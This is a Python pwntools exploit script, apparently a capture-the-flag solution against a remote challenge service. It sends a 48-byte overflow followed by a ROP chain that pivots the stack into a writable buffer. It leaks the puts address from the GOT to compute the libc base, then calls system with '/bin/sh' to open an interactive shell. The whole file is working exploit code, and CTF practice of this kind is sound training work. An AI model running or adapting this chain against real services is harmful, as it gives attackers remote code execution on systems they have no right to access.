from pwn import *

context.arch = 'amd64'

# host = '127.0.0.1'
# port = 8888
host = 'csie.ctf.tw'
port = 10132

r = remote(host, port)

# input('Press enter to continue.')

payload = b'a'*48
pop_rdi = 0x00000000004006b3
pop_rdx = 0x00000000004006d4
pop_rsi_r15 = 0x00000000004006b1
leave_ret = 0x000000000040064a
read_plt = 0x4004e0
puts_plt = 0x4004d8
puts_got = 0x600fd8
buf1 = 0x602000-0x200
buf2 = buf1 + 0x100

# read(0, buf1, size)
rop = flat([buf1, pop_rdi, 0, pop_rsi_r15, buf1, 0, pop_rdx, 0x100, read_plt, leave_ret])
r.recvuntil(':')
r.send(payload + rop)

rop2 = flat([buf2, pop_rdi, puts_got, puts_plt, pop_rdi, 0, pop_rsi_r15, buf2, 0, pop_rdx, 0x100, read_plt, leave_ret])
r.sendline(rop2)

r.recvuntil('\n')
puts = u64(r.recvuntil('\n')[:-1].ljust(8, b'\x00'))
libc = puts - 0x6f690
system = libc + 0x45390
print(hex(system))

rop3 = flat([buf1, pop_rdi, buf2 + 4*8, system, '/bin/sh\x00'])
r.sendline(rop3)

r.interactive()
